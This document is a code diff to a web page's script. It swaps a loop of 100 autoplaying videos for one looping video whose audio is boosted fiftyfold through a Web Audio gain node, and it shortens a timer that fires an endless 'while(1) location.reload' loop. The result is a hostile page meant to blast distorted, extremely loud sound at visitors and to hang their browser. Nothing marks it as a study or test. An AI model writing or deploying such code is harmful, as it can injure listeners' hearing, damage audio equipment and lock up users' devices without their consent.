@@ -29,28 +29,35 @@
                 const base64String = await response.text();
                 const videoSrc = 'data:video/mp4;base64,' + base64String;
                 
-                // Create 100 video elements
-                for (let i = 0; i < 100; i++) {
-                    const video = document.createElement('video');
-                    video.src = videoSrc;
-                    video.width = 200;
-                    video.height = 150;
-                    video.volume = 1.0;
-                    video.loop = true;
-                    video.style.margin = '5px';
-                    videoContainer.appendChild(video);
-                    
-                    video.play().catch(e => {
-                        console.log('Autoplay blocked');
-                    });
-                }
+                // Create audio context for amplification
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Create 1 video element with amplified audio
+                const video = document.createElement('video');
+                video.src = videoSrc;
+                video.width = 560;
+                video.height = 315;
+                video.volume = 1.0;
+                video.loop = true;
+                videoContainer.appendChild(video);
+                
+                // Connect to audio context for extreme amplification
+                const source = audioContext.createMediaElementSource(video);
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 50.0; // 50x amplification
+                source.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                video.play().catch(e => {
+                    console.log('Autoplay blocked');
+                });
             } catch (e) {
                 console.error('Failed to load video:', e);
             }
             
             setTimeout(() => {
                 while(1) location.reload(1);
-            }, 5000);
+            }, 1000);
         });
     </script>
 </body>
